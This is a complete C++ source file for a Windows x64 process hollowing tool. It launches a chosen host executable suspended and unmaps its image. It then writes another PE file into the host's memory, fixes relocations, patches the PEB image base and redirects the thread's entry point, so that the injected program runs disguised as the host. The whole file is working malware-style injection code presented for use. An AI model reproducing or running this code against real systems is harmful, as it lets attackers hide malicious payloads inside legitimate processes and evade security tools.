#include <Windows.h>
#include <cstdio>
#include <winternl.h>

LPSTR lpInjImg;
LPSTR lpHostImg;

//Define NtUnmapViewOfSection 
typedef NTSTATUS(NTAPI* pfnNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
pfnNtUnmapViewOfSection NtUnmapViewOfSection = reinterpret_cast<pfnNtUnmapViewOfSection>(GetProcAddress(ntdllModule, "NtUnmapViewOfSection"));

  


// Stores Processes Important Address Inforamtion
struct ProcAdresses
{
	LPVOID lpProcPEBAddr;
	LPVOID lpProcImgBaseAddr;
};


// Points Ti Relocation Entry Point
typedef struct IMAGE_RELOCATION_ENTRY {
	WORD Offset : 12;
	WORD Type : 4;
} IMAGE_RELOCATION_ENTRY, *PIMAGE_RELOCATION_ENTRY;


//Unmap The Original Memory From The Host
BOOL UnmapHost(const LPPROCESS_INFORMATION lpProcInfo, LPVOID lpProcImgBaseAddr){
	DWORD dwResult = NtUnmapViewOfSection(lpProcInfo->hProcess,lpProcImgBaseAddr);
	if (dwResult)
	{
    	printf("*** Can't Unmap Memory From HOST ***\n");
      	return FALSE;
	}
	return TRUE;
}

//Gets File Contenrs
HANDLE GetFileContent(const LPSTR lpFilePath)
{
	//Crate Handle To The File
	const HANDLE hFile = CreateFileA(lpFilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("*** Can't Read File ***\n");
		return NULL;
	}

	const DWORD dwFileSize = GetFileSize(hFile, NULL);
	if (dwFileSize == INVALID_FILE_SIZE)
	{
		printf("*** Can't Get File Zize *** \n");
		return NULL;
	}

	//Allocate Memory In Heap For The File
	const HANDLE hFileContent = HeapAlloc(GetProcessHeap(), 0, dwFileSize);
	if (hFileContent == INVALID_HANDLE_VALUE)
	{
		printf("*** Can't Allocate Memory For File ***\n");
		return NULL;
	}

	const BOOL bFileRead = ReadFile(hFile, hFileContent, dwFileSize, NULL, NULL);
	if (!bFileRead)
	{
		printf("*** Can't Read File To Memory ***\n");
		CloseHandle(hFile);
		if (hFileContent != NULL)
			CloseHandle(hFileContent);
		return NULL;
	}

	CloseHandle(hFile);
	return hFileContent;
}

//Get Important Adresses For The Process. PEB & Image Base Address Which Compose The ProcAdresses Structure Defined At The Start Of The Project
ProcAdresses GetProcAddrs(const PPROCESS_INFORMATION lpProcInfo)
{
	LPVOID lpImgBaseAddr = NULL;
	CONTEXT ContX = {};
	ContX.ContextFlags = CONTEXT_FULL;
	GetThreadContext(lpProcInfo->hThread, &ContX);
	const BOOL bReadBaseAddress = ReadProcessMemory(lpProcInfo->hProcess, (LPVOID)(ContX.Rdx + 0x10), &lpImgBaseAddr, sizeof(UINT64), NULL);
	if (!bReadBaseAddress)
		return ProcAdresses{ NULL, NULL };

	return ProcAdresses{ (LPVOID)ContX.Rdx, lpImgBaseAddr };
}

// Get Relocation Address For The Process
IMAGE_DATA_DIRECTORY GetRelocAddr(const LPVOID lpImage)
{
	const auto lpImgDOSHead = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImgDOSHead + lpImgDOSHead->e_lfanew);
	if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
		return lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	return { 0, 0 };
}

//Load Image To Process, Relocate It And Run It
BOOL InjectFile(const LPPROCESS_INFORMATION lpProcInfo, const LPVOID lpImage)
{
	LPVOID lpAllocAddr;

	const auto lpImgDOSHead = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImgNTHead = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImgDOSHead + lpImgDOSHead->e_lfanew);

	lpAllocAddr = VirtualAllocEx(lpProcInfo->hProcess, NULL, lpImgNTHead->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAllocAddr == NULL)
	{
		printf("*** Can't Allocate Memory In Target Process ***\n");
		return FALSE;
	}

	printf("<+> Memory Allocated In Target Process \n");

	const DWORD64 dwDeltaImgBase = (DWORD64)lpAllocAddr - lpImgNTHead->OptionalHeader.ImageBase;

	lpImgNTHead->OptionalHeader.ImageBase = (DWORD64)lpAllocAddr;
	const BOOL bHeadWritten = WriteProcessMemory(lpProcInfo->hProcess, lpAllocAddr, lpImage, lpImgNTHead->OptionalHeader.SizeOfHeaders, NULL);
	if (!bHeadWritten)
	{
		printf("*** Can't Write Headers ***.\n");
		return FALSE;
	}

	printf("<+> Headers Written\n");

	const IMAGE_DATA_DIRECTORY ImgContentReloc = GetRelocAddr(lpImage);
	PIMAGE_SECTION_HEADER lpImgRelocSec = NULL;

	for (int i = 0; i < lpImgNTHead->FileHeader.NumberOfSections; i++)
	{
		//Set Address For Next Section
		const auto lpImgSecHead = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImgNTHead + 4 + sizeof(IMAGE_FILE_HEADER) + lpImgNTHead->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		//Find Relocation Section
		if (ImgContentReloc.VirtualAddress >= lpImgSecHead->VirtualAddress && ImgContentReloc.VirtualAddress < (lpImgSecHead->VirtualAddress + lpImgSecHead->Misc.VirtualSize))
			lpImgRelocSec = lpImgSecHead;
		//Write Section To Target Process
		const BOOL bWrittenToSection = WriteProcessMemory(lpProcInfo->hProcess, (LPVOID)((UINT64)lpAllocAddr + lpImgSecHead->VirtualAddress), (LPVOID)((UINT64)lpImage + lpImgSecHead->PointerToRawData), lpImgSecHead->SizeOfRawData, NULL);
		if (!bWrittenToSection)
		{
			printf("*** Can't Write Section ***\n");
			return FALSE;
		}
	}
	printf("<+> Sections Written\n");

	DWORD dwRelocOffset = 0;

	while (dwRelocOffset < ImgContentReloc.Size)
	{
		// Find The Relocation Entry For The Current Offset
		const auto lpImgBaseReloc = (PIMAGE_BASE_RELOCATION)((DWORD64)lpImage + lpImgRelocSec->PointerToRawData + dwRelocOffset);
		dwRelocOffset += sizeof(IMAGE_BASE_RELOCATION);
		// FindTthe Number Of Relocation Entries In The Block
		const DWORD dwNumberOfEntries = (lpImgBaseReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY);

		for (DWORD i = 0; i < dwNumberOfEntries; i++)
		{
			// Find The Relocation Entry For The Current offset
			const auto lpImgBaseRelocEntry = (PIMAGE_RELOCATION_ENTRY)((DWORD64)lpImage + lpImgRelocSec->PointerToRawData + dwRelocOffset);
			dwRelocOffset += sizeof(IMAGE_RELOCATION_ENTRY);

			if (lpImgBaseRelocEntry->Type == 0)
				continue;

			//
			const DWORD64 dwCurrentAddr = (DWORD64)lpAllocAddr + lpImgBaseReloc->VirtualAddress + lpImgBaseRelocEntry->Offset;
			DWORD64 dwRelocatedAddr = 0;

			//read Current Address
			ReadProcessMemory(lpProcInfo->hProcess, (LPVOID)dwCurrentAddr, &dwRelocatedAddr, sizeof(DWORD64), NULL);
			//Add Image Base
			dwRelocatedAddr += dwDeltaImgBase;
			//Write After Adding The Image Base (Current+ImageBase)
			WriteProcessMemory(lpProcInfo->hProcess, (LPVOID)dwCurrentAddr, &dwRelocatedAddr, sizeof(DWORD64), NULL);

		}
	}

	printf("<+> Relocated Image.\n");

	CONTEXT ContX = {};
	ContX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = GetThreadContext(lpProcInfo->hThread, &ContX);
	if (!bGetContext)
	{
		printf("*** Can't Get Thread Context ***\n");
		return FALSE;
	}

	const BOOL bWrittenToProcMem = WriteProcessMemory(lpProcInfo->hProcess, (LPVOID)(ContX.Rdx + 0x10), &lpImgNTHead->OptionalHeader.ImageBase, sizeof(DWORD64), NULL);
	if (!bWrittenToProcMem)
	{
		printf("*** Can't Change Image Base in PEB ***\n");
		return FALSE;
	}

	ContX.Rcx = (DWORD64)lpAllocAddr + lpImgNTHead->OptionalHeader.AddressOfEntryPoint;

	const BOOL bContextSet = SetThreadContext(lpProcInfo->hThread, &ContX);
	if (!bContextSet)
	{
		printf("*** Can't Change Thread Context ***\n");
		return FALSE;
	}

	ResumeThread(lpProcInfo->hThread);

	return TRUE;
}

int main(const int argc, char* argv[])
{
	if (argc == 3)
	{
		lpInjImg = argv[1];
		lpHostImg = argv[2];
	}
	else
	{
		printf("(> ProcHollow.exe <FileToInject> <ProcessToHollow>\n(> For The Injected Process To Under The Hollowed Process They Must Be Under The Same Subsystem (ex: Not GUI and CLI)\n(> Only Works On x64 PE Files");
		return 0;
	}
	const LPVOID hFileContent = GetFileContent(lpInjImg);
	if (hFileContent == NULL)
		return 0;



	STARTUPINFOA StartUpInfo;
	PROCESS_INFORMATION ProcInfo;

	ZeroMemory(&StartUpInfo, sizeof(StartUpInfo));
	StartUpInfo.cb = sizeof(StartUpInfo);
	ZeroMemory(&ProcInfo, sizeof(ProcInfo));

	const BOOL bProcessCreated = CreateProcessA(lpHostImg, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &StartUpInfo, &ProcInfo);
	if (!bProcessCreated)
	{
		printf("*** Can't Create Host Process ***\n");
		return 0;
	}
	printf("<+> Process Started In Suspeded Mode: %s\n<+> PID: %lu\n",lpHostImg,ProcInfo.dwProcessId);
	ProcAdresses ProcAdresses = {NULL, NULL};
	ProcAdresses = GetProcAddrs(&ProcInfo);
	if (ProcAdresses.lpProcImgBaseAddr == NULL || ProcAdresses.lpProcPEBAddr == NULL)
	{
		printf("*** Can't Find Important Addresses In Host Process\n");
		return 0;
	}
	
	BOOL UnMapped=UnmapHost(&ProcInfo,ProcAdresses.lpProcImgBaseAddr);
	if(!UnMapped)
		return 0;	
	printf("<+> Memory Unmapped From Host Process\n");


	if (InjectFile(&ProcInfo, hFileContent))
	{
		printf("<+> Process Injected!\n");
		return 0;
	}
	
	printf("*** The injection has failed !\n");
	return 0;
}